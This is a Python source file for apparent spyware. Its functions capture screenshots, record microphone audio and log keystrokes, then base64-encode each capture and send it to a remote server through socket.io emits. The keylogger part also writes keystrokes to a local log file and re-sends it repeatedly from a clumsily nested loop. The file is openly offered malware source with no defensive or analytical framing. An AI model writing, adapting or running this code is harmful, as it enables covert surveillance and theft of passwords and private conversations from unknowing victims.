import base64
import io
import time
import wave

import keyboard
import pyaudio
import pyautogui
from PIL import Image


def take_and_send_screenshot(sio):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)
        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
        print("Capture d'écran envoyée")
    except Exception as e:
        print(f"Échec de la capture d'écran: {e}")
        pass


def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


def record_and_send_audio(duration=10, sio=None):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_bytes = b''.join(frames)
        audio_io = io.BytesIO()
        save_wave_file(audio_io, audio_bytes)

        audio_io.seek(0)
        audio_encoded = base64.b64encode(audio_io.read()).decode()
        sio.emit('audio_response', {'audio': audio_encoded})
        print("Audio envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement audio: {e}")
        pass


def save_wave_file(file_io, audio_data):
    with wave.open(file_io, 'wb') as wave_file:
        wave_file.setnchannels(1)
        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(audio_data)


def record_and_send_keyboard_log(duration=10, sio=None, start_time=None):
    try:
        print("Enregistrement du keylogger en cours...")
        start_time = time.time() if start_time is None else start_time
        keyboard_log = []

        while time.time() - start_time < duration:
            event = keyboard.read_event()
            event_time = time.time()
            keyboard_log.append((event.scan_code, event.name, event.time))

            file_path = 'keylogger.log.txt'
            with open(file_path, 'w') as f:
                for scan_code, name, event_time in keyboard_log:
                    f.write(f"{event_time} - {name} - {scan_code}\n")

                    print("Keylogger enregistré dans keylogger.log.txt")

                    if sio:
                        with open(file_path, 'r') as f:
                            log_content = f.read()
                            sio.emit('keyboard_response', {'log': log_content})
                            print("Keylogger envoyé à L'API")
    except Exception as e:
        print(f"Échec de l'enregistrement du keylogger: {e}")

